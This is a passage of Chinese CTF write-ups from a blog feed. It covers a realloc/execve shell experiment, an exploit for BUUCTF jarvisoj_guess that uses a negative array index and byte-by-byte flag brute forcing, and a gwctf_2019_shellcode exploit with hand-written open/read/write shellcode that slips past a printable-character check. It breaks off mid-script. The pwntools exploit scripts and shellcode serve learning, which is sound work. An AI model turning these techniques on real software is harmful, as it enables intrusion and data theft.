<p>虽然这个指针指向的是数字1，不过依然最终也可以获取shell。</p>
<p>同时也可以做一个小测试,就是将argv里面放个Int类型的指针，指向整数，看看execve函数还能否获取shell。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> arg, <span class="type">char</span> **args)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *p;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">    p=&amp;a;</span><br><span class="line">    <span class="type">char</span> *argv[]=&#123;p,<span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="type">char</span> *envp[]=&#123;<span class="number">0</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>,argv,envp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012846.png"></p>
<p>发现是成功的又开启了一个shell。</p>
<blockquote>
<p>因此得出结论，one_gadget的生效条件是获取shell的充分条件，也就是说获取shell不一定要满足one_gadget的条件。</p>
</blockquote>
<p>为什么realloc+1和realloc+3也能获取shell呢？</p>
<p>通过调试发现realloc+1和realloc+3开始执行的话，执行的并不是正确的机器码<strong>，而是机器码进行了错位。不过正好错位之后，依然是个push指令，导致了realloc+1其实和realloc的栈中情况是一样的，而realloc+3和realloc+2的栈中情况是一样的</strong>。（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012012847.png"></p>
<p>由此可见，即使机器码错位，但push指令依然没变，仅仅变的是push后面的寄存器。所以并不改变栈帧</p>
]]></content>
      <categories>
        <category>探究</category>
      </categories>
      <tags>
        <tag>realloc调整栈帧</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF_jarvisoj_guess</title>
    <url>/posts/992e244b.html</url>
    <content><![CDATA[<p>通过这道题的学习与收获有：（说实话，我把这玩意拖到IDA里的一刻，我是想直接把它扔进回收站的，不过最终还是硬着头皮做下来了，收获也真的很多）</p>
<p>1、这道题的漏洞点是数组下标的不检查，导致char类型可能自身变成负数，使得我们可以输入不正常数据来通过对flag的检查。</p>
<p>2、使用单字节爆破的手段，获取flag，这道题对于flag的检查是判断整体的，但之所以可以进行单字节爆破是因为我们是先通过了flag的检查，然后依次改变一字节，来观察回显，我们的flag是否正确，从而进行单字节的爆破。并且还有一个前提是不限次数的输入内容（只要内容是100字节，就可以与flag进行比较判断）</p>
<p>3、当时关于本机的flag和远程的flag这里迷了好久，我一直以为本机的是假flag，然后远程是通过某种加密手段放的是真flag（意思就是说本机flag和远程flag我感觉应该是有关系的），最后看了下前面的英文提示，又想了很久最后发现，这俩flag之间并没有任何关系…</p>
<p>4、我们始终都没法直接控制value_1和value_2的值，我们仅仅只能去控制bin_by_hex数组的索引，而我们爆破的其实是bin_by_hex数组的下标，而真正的flag是通过这个下标去数组bin_by_hex里面找到真正flag的所对应的字符。之所以给我们一种爆破flag的错觉其实是因为爆破的bin_by_hex数组下标正好又是对应字符的ascii（比如我爆破b的时候，分别发了6和2，这个0x62其实是bin_by_hex的下标，但是这个下标放的又正好是b）因此就感觉我们在爆破flag一样。关于这个bin_by_hex数组与它的下标这里，我迷了很久。</p>
<p>5、这道题最后的爆破脚本我感觉还是需要一些python功底才能写出来的（我是看了下师傅们的 exp才写出来的）</p>
<p>6、这道题最恶心的地方就是调试很麻烦（其实我压根就不会…），而且对于这道题调试而言的话，也不知道调试该看什么，又是要连接的，又是fork的，确实不会调…</p>
<p>7、熟悉了一下常见网络编程函数的功能，用IDA简单对他们进行了流程的分析。</p>
<span id="more"></span>

<h1 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h1><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014559.png"></p>
<h1 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h1><h2 id="关于socket网络编程的内容分析"><a href="#关于socket网络编程的内容分析" class="headerlink" title="关于socket网络编程的内容分析"></a>关于socket网络编程的内容分析</h2><p>由于一打开程序看到的就是socket网络编程的那些函数，不过这些都和这道题没有关系，<strong>关于这些函数我将放在文章的最后分析，下面直接开始上正片。</strong></p>
<h2 id="重要的英文提示"><a href="#重要的英文提示" class="headerlink" title="重要的英文提示"></a>重要的英文提示</h2><p>这个程序的入手点，其实是人家给出来的提示。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014560.png"></p>
<p>上面这四行话很关键，要是不注意的话，其实是很难理解这道题目。</p>
<p>大概意思就是说，现在你本地的这个程序是一个测试程序，在这个测试程序里面的flag，是以FAKE{开始的，其实你可以发现，<strong>本机上的flag，ida打开之后就直接看见了</strong>。也就是说这道题本机上的flag你是可以看见的，但是第四行说了，<strong>具有real flag的程序是运行在服务器那边的</strong>，它是以PCTF{开头的，并且是50个字符  （但是这道题我是从BUUCTF上做的，因此buu上服务器那边的flag依然是以flag{开头的）</p>
<p>一句话总结就是，<strong>本机上的flag你能看见，服务器那边运行的这个程序同样的位置也有一个flag（和你本机上的flag不一样）你看不见，但是你要想办法知道它。</strong> </p>
<h2 id="一个奇怪的负数索引"><a href="#一个奇怪的负数索引" class="headerlink" title="一个奇怪的负数索引"></a>一个奇怪的负数索引</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014561.png"></p>
<p>可以发现整个程序的漏洞点在这个函数里。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014562.png"></p>
<p>首先看这个地方，数组里面的下标索引值又是一个数组，这个地方应该是很容易出现问题的，再仔细分析一下，数组里面的那个数组（其实也不是数组，只是个以索引方式来检索的一个char指针），这个东西是个char类型的，char类型的怎么可以作为下标呢。</p>
<p><strong>char类型的值强转为int类型之后，超过127的话，则会变成负数</strong></p>
<p>写个脚本验证一下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014563.png"></p>
<p>因为我们可以控制flag_hex的值，而这个值我们还可以让他可正可负，因此可以利用这个点，去让value_1和value_2得到一些不正常的数据，这个点放在这里，继续往下分析。</p>
<h2 id="分析合并v1和v2以及检查部分"><a href="#分析合并v1和v2以及检查部分" class="headerlink" title="分析合并v1和v2以及检查部分"></a>分析合并v1和v2以及检查部分</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014564.png"></p>
<p>这个地方，其实我自己没看明白，不过我又写了个c的程序，模拟了一下。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014565.png"></p>
<p>这回比较清晰了，value_1和value_2会合成一个十六进制的字符(en…上面的value_a就是我说的value_1，当时这里打错了），其中value_1是高位，value_2是低位。</p>
<p>然后就是flag[i_0]与given_flag[i_0]去异或比较，必须二者使用相同，最后的diff才是0，否则diff不是0（因为有个|，只要一次不是0，之后自己再和自己|的话，就永远都变不会0了）</p>
<p>而flag[i_0]里面装的就是flag（本机的话，你是可以直接看见的…，但是远程那边的flag你是看不见的，它被复制到了flag[i_0]里面）</p>
<p>而given_flag[i_0]则很有意思，它是前面两个value_1和value_2拼成的一个字符（拼成的是个十六进制数字然后对应其ASCII码）</p>
<h2 id="利用负数索引"><a href="#利用负数索引" class="headerlink" title="利用负数索引"></a>利用负数索引</h2><p>而value_1和value_2的值则是从bin_by_hex是数组里面靠索引来获取的。下面是bin_by_hex里面的内容（未截全）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014566.png"></p>
<p>这是？？？似乎感觉有点离谱，但是别忘了，我们上面提到了这个索引也可以取负数，因此看一下栈里的情况（上图原本是数据是在data段，但是这串数据被qmemcpy函数拷贝到了栈里，而依靠索引来找数据是在栈中实现的）<br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014567.png"></p>
<p>发现了flag（flag也被qmemcpy函数拷贝到了栈中），居然就在bin_by_hex的上面而且距离仅仅只有0x40个字节。那我们通过负数的索引岂不是就可以很顺利的将given_flag[i_0]设置为flag。我们将value_1去设置为0（因为它乘了个16，不太好控制，把它设置为0之后，只需要控制一个value_2即可），让value_2去为flag的字符即可。<strong>不过我们最终爆破真的flag的时候，是需要分别控制value_1和value_2</strong></p>
<h2 id="关于将value-1设置为0这件事"><a href="#关于将value-1设置为0这件事" class="headerlink" title="关于将value_1设置为0这件事"></a>关于将value_1设置为0这件事</h2><p>因为我们最后发送的肯定是字符0，对应的ASCII码应该是0x30（因为char类型被作为数组下标的时候，会被自动转换成int类型），因此去bin_by_hex里面找一下0x30的索引。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014568.png"></p>
<p>发现是0（这个0可是int类型的），因此在given_flag[i] &#x3D; value2 | (16 * value1);这步的时候，given_flag[i]的值就完全取决于value_2了</p>
<h1 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h1><h2 id="计算负数索引"><a href="#计算负数索引" class="headerlink" title="计算负数索引"></a>计算负数索引</h2><p>我们来尝试一下这件事情，首先我们输入的内容一定要让其值为负数（因为我们需要这个负数索引），而这个负数的索引应该是要从-64开始逐渐减小（因为这个索引取得的内容距离bin_by_hex是越来越近的）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014569.png"></p>
<p>再次运行一下c写的程序，发现只要我们输入192，char被作为索引时，会自动转换成int类型，而值为-64.依次类推，我们需要50个这样的索引，因为flag是50个字符。</p>
<p>我们用python脚本来实现一下这件事。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29002</span>)</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">192</span>,<span class="number">192</span>+<span class="number">50</span>):</span><br><span class="line">    payload+=<span class="string">&#x27;0&#x27;</span>+<span class="built_in">chr</span>(i)<span class="comment">#第一次输入字符0，让value_1的值为0</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;guess&gt; &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后…</p>
<p><img src="/../img/2706180-20220407214108228-1548324711.png"></p>
<p>它提示你输入对了flag，<strong>但是事实上我们压根输入的就不是flag</strong>，只不过是通过输入一些非正常的数据，<strong>产生了一个负数索引，然后利用这个索引去找到了flag，从而通过了检查</strong>，<strong>而我们是不知道flag的</strong>。</p>
<h2 id="凭借伪造的flag实现单字节爆破"><a href="#凭借伪造的flag实现单字节爆破" class="headerlink" title="凭借伪造的flag实现单字节爆破"></a>凭借伪造的flag实现单字节爆破</h2><p>不过好消息是，<strong>我们可以一直输入，只要我们输入的是一百个字节的内容</strong>（因为程序对输入的长度是否是100字节进行了检查），程序就可以告诉我们输入的内容是正确还是错误。这个程序会将我们输入的内容作为一个整体去与flag进行判断，本来这种题目是无法单字节爆破的，<strong>但是我们现在可以靠伪造一个flag去通过检查了，同时我们还可以继续输入内容，让程序判断输入的flag对不对，那我们只需要去每次改变一个字节，如果程序提示Yaaaay!，则说明我们爆破的这个字节是正确的，那就换下一个字节爆破，如果没有提示Yaaaay! 那就换个字符继续爆破这个字节。直到将所有的flag全部爆破出来</strong>。</p>
<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29002</span>)</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">192</span>,<span class="number">192</span>+<span class="number">50</span>):</span><br><span class="line">    payload+=<span class="string">&#x27;0&#x27;</span>+<span class="built_in">chr</span>(i)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;guess&gt; &#x27;</span>)</span><br><span class="line"><span class="comment">#p.sendline(payload)#当用这部分内容让检查通过时，应该把这一部分注释掉，如果没有注释掉的话，会导致下面发送的内容，第一次的循环修改了内容之后，也通过了检查，因为recvline收到的是，这个payload的Yaaaay!，从而导致下面的检查判断是从第二字节开始，然后就陷入了死循环（因为第一个字节就是错的，即使第二字节爆破出来了，也不会显示Yaaaay!）</span></span><br><span class="line"><span class="comment">#这个解释是我通过观察debug的回显信息分析出来的，不能保证百分百对，不过目前我认为是这样。</span></span><br><span class="line"></span><br><span class="line"><span class="type">List</span> = [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里的话，自己建个列表或者用string,printable效果是一样的，这个无所谓</span></span><br><span class="line">kkk=<span class="built_in">list</span>(payload)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span><span class="comment">#新建一个空的flag字符串，一会爆破出来真的flag将放入这个里面</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="comment">#for x in string.printable:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">        kkk[<span class="number">2</span>*i]=<span class="built_in">hex</span>(<span class="built_in">ord</span>(x))[<span class="number">2</span>]<span class="comment">#这个地方是从列表中取一个x，然后将其转换成16进制，用切片取低位</span></span><br><span class="line">        <span class="comment">#print(&quot;kkk[2*i])==&quot;+kkk[2*i])</span></span><br><span class="line">        kkk[<span class="number">2</span>*i+<span class="number">1</span>]=<span class="built_in">hex</span>(<span class="built_in">ord</span>(x))[<span class="number">3</span>]<span class="comment">#用切片取高位 舍弃前面的0x</span></span><br><span class="line">        <span class="comment">#print(&quot;kkk[2*i+1])==&quot;+kkk[2*i+1])</span></span><br><span class="line">        p.sendline(<span class="string">&quot;&quot;</span>.join(kkk))<span class="comment">#将列表kkk添加到字符串里面</span></span><br><span class="line">        re=p.recvline()<span class="comment">#去接收一行的信息</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Yaaaay!&#x27;</span> <span class="keyword">in</span> re:<span class="comment">#判断Yaaaay!是否在这一行出现</span></span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014570.png"></p>
<h1 id="关于前面的网络编程的内容分析"><a href="#关于前面的网络编程的内容分析" class="headerlink" title="关于前面的网络编程的内容分析"></a>关于前面的网络编程的内容分析</h1><p>作为大一小萌新，这个学期才刚刚开了计网，嗯…不知道关于这些网络编程在计网课程的后期会不会讲，这里提前学习一下。</p>
<h2 id="socket函数"><a href="#socket函数" class="headerlink" title="socket函数"></a>socket函数</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014571.png"></p>
<p>这玩意参数2,1,0就分别代表着 ipv6类型，面向连接的套接字，使用TCP传输协议    然后这个socket函数就是创建了个套接字，你要是不理解啥是套接字，你就把它当成一个文件（linux下万物皆文件），然后返回一个文件描述符（也就是新创建的这个套接字）</p>
<h2 id="bind函数"><a href="#bind函数" class="headerlink" title="bind函数"></a>bind函数</h2><p>下面这个bind函数就很好理解了，就是将IP地址和端口与刚才创建的套接字进行绑定，你可能会问，这参数里面也没传IP地址和端口呀，其实IP地址和端口都在sockaddr这个结构体(在这里面这个结构体就是bind_addr)里面，而你又将这个结构体的地址当做参数传给了bind函数。因此其实bind函数是知道IP地址和端口的。</p>
<p>它的第一个参数就是刚才创建的套接字的文件描述符，第二个参数是bind_addr结构体的地址，第三个参数是bind_addr结构体的大小（这个是定死的）。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014573.png"></p>
<p>值得一提的就是这个结构体</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014574.png"></p>
<p>最后的sin_port成员，被赋值成了0x270F，也就是端口为9999。</p>
<h2 id="listen函数"><a href="#listen函数" class="headerlink" title="listen函数"></a>listen函数</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014575.png"></p>
<p>这个参数更简单了，第一个依然是创建套接字的文件描述符，第二个参数是连接请求队列的长度。</p>
<p>这个函数的意思就是说，让刚才创建的套接字变成被动连接，让当下的这个进程可以接收其他进程的请求，就有点服务器的那种样子嗷。</p>
<h2 id="accept函数"><a href="#accept函数" class="headerlink" title="accept函数"></a>accept函数</h2><p>这个函数的意思就是创立一个新的文件描述符（你能看见它的返回值是一个新的文件描述符），这个新的文件描述符其实就是一个连接通道，接下来发送和接收的数据都将通过这个连接通道。而原本的那个文件描述符依然在监听port。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014576.png"></p>
<p>我在网上发现这个图片说的很好，搬一下 <a href="%5Bhttps://blog.csdn.net/BengDouLove/article/details/105695351?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1.pc_relevant_default&utm_relevant_index=1%5D(https://blog.csdn.net/BengDouLove/article/details/105695351?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1.pc_relevant_default&utm_relevant_index=1)">图片出自这里</a></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014577.png"></p>
<p>这张是socket模型图，来源同上</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014578.png"></p>
<p>然后这个地方就在说，fork了一个子进程，如果fork成功的话，就把最开始创建的那个套接字给关了，然后去处理新开的这个套接字。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014579.png"><br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014580.png"></p>
<p>这里就是说把标准输入和标准输出重定向到这个新开的套接字上。</p>
<h2 id="这几个函数干了啥？"><a href="#这几个函数干了啥？" class="headerlink" title="这几个函数干了啥？"></a>这几个函数干了啥？</h2><p>整体下来的话，也并不复杂，就是在说开了一个程序自身9999的端口，等待着你连接，如果连接上来的话就开启一个新的进程，然后开始对这个新的进程操作。</p>
<p>在本地运行的话，也是可以看见，程序自己打开了9999端口</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012014581.png"></p>
<h1 id="最后想强调的一点"><a href="#最后想强调的一点" class="headerlink" title="最后想强调的一点"></a>最后想强调的一点</h1><p>这里已经在开始的总结里说过了，不过依然想强调一下，我们是始终都没法直接控制value_1和value_2的值，我们仅仅只能去控制bin_by_hex数组的索引，而我们爆破的其实是bin_by_hex数组的下标，而真正的flag是通过这个下标去数组bin_by_hex里面找到真正flag的所对应的字符。之所以给我们一种爆破flag的错觉其实是因为爆破的bin_by_hex数组下标正好又是对应字符的ascii（比如我爆破b的时候，分别发了6和2，这个0x62其实是bin_by_hex的下标，但是这个下标放的又正好是b）因此就感觉我们在爆破flag一样。</p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>爆破</tag>
        <tag>数组索引无检查</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF_gwctf_2019_shellcode</title>
    <url>/posts/a3bb0057.html</url>
    <content><![CDATA[<p>通过这道题的学习与收获有：</p>
<p>1、strlen函数是可以被00给截断的，而shellcode本身执行的时候并不会因为00截断。</p>
<p>2、第一次手写open,read,write函数的汇编</p>
<p>3、push一个字符串的话，比如push 0x67616c66 （这个是flag），不足八字节，push的时候会自动填充00补全八字节，从而占满一个内存单元。</p>
<span id="more"></span>

<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012015865.png"></p>
<p>发现没开NX，那基本就是shellcode没跑了。</p>
<p>然后发现开启了沙箱，禁用了execve函数，那就考虑写一个orw的shellcode</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012015866.png"></p>
<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012015867.png"></p>
<p>由于这个main函数里面存在一个这个汇编指令，因此不能生成伪代码，那就只能读汇编了，好在程序也不复杂。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012015868.png"></p>
<p>逻辑就是执行is_printable之后，去将eax与自身相与，如果eax的值为1，test执行之后的运算结果为1（标志寄存器的值为0,否则反之)如果标志寄存器的值为1，则jz指令进行跳转，跳转到loc_AC1函数，如果触发了该函数则程序直接结束，并不会触发call rax的指令，如果jz不进行跳转，则执行call rax（执行完lea之后，rax的值存放的就是read函数输入进去的内容，因此我们输入的时候直接布置shellcode即可）。</p>
<h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><p>因此我们要触发call rax，就需要让loc_AC1函数的返回值为0。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012015869.png"></p>
<p>而这个函数返回值为0的前提就是输入的内容ascii码必须要大于31，并且不能等于127。因为我们构造的shellcode经常会存在不可见字符，因此这里我起初考虑的是将写的shellcode转换成可见字符。</p>
<p>然后转换成可见字符发现，这个shellcode太长了。（下面是转换成可见字符之后的shellcode）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012015870.png"></p>
<p>然后到这里就卡住了，参考了另一篇师傅的博客，发现strlen函数是可以被00截断的（我自己试了一下发现确实如此）</p>
<p>也就是说只要让shellcode中出现00，并且在00之前的是可见字符就ok了，因为strlen获取的长度就到00这里。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012015871.png"></p>
<p>这个循环就不会再往后跑了，因此它不会对00后面的内容进行检查。在这里要说一下，<strong>shellcode本身执行的话并不会被00截断，因为shellcode本身毕竟就是一堆机器码而已，CPU执行机器码的时候，才不管你什么00截断不截断呢，机器码是什么它就执行什么。真正会因为00而截断shellcode的其实是一些函数,比如strcpy这个函数。</strong></p>
<p>因此我们只需要让shellcode中尽早的出现00机器码即可</p>
<p>然后就是开始手动编写shellcode了。</p>
<h2 id="手写orw-shellcode"><a href="#手写orw-shellcode" class="headerlink" title="手写orw-shellcode"></a>手写orw-shellcode</h2><p>首先我们要执行的如下的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(flag_addr,<span class="number">0</span>)</span><br><span class="line">read(<span class="number">3</span>,addr,<span class="number">0x50</span>)<span class="comment">#第一个参数是3，因为一个进程有默认的文件描述符0,1,2。当再打开新的文件之后，文件描述符就会以此类推的分配，因此上面open新打开的flag文件的文件描述符就是3</span></span><br><span class="line"><span class="comment">#至于这个addr，把读出来的flag放到哪，一会再说</span></span><br><span class="line">write(<span class="number">1</span>,addr,<span class="number">0x50</span>)</span><br></pre></td></tr></table></figure>

<p>接下来，就开始用汇编来实现上面的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(flag_addr,0)</span><br><span class="line">push 0x67616c66</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">#上面这两步就是在传open的第一个参数，这个参数要是一个地址，这个地址要指向字符串&#x27;flag&#x27;</span><br><span class="line">#执行完push 0x67616c66的时候，栈顶的内容就是字符串flag，而栈顶指针rsp就指向了这个flag，此时执行push rsp将指向flag的地址（也就是rsp）压栈，此时栈顶的内容就是那个指向flag的地址，然后再执行pop rdi</span><br><span class="line">#将栈顶的这个内容弹给rdi，此时open的第一个参数就成为了指向flag的地址</span><br><span class="line">push 0#这个push 0这里就会出现机器码00，用来截断strlen函数</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">read(3,addr,0x50)</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push rsp </span><br><span class="line">pop rsi</span><br><span class="line">#上面这两步在完成read函数的第二个参数传参，此时压入栈的rsp，我并不知道这个地址是什么，只知道把这个地址给rsi的话，flag就会被写到这个地址里面，至于这个地址是什么，真的不重要，重要的是要保证接下来write的第二个参数也是这个地址即可，而我们要做的就是保证接下来的每一个push都要对应一个pop，这样栈顶始终就是给当初rsi的那个地址了。</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">write(1,addr,0x50)</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">#这个地方的push rsp pop rsi原理同上</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><p>最后脚本的话有一点要注意一下。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012015872.png"></p>
<p>这个地方有一个指令，它将把我们输入的payload的最后一字节改成0。（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012015873.png"><br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012016675.png" alt="image-20230701201652427"></p>
<p>这样的后果就是将我们的shellcode最后一个syscall给破坏了，因此我们在syscall后面随便再写个指令，syscall就是完整的了。</p>
<p>最后exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28435</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 3</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span 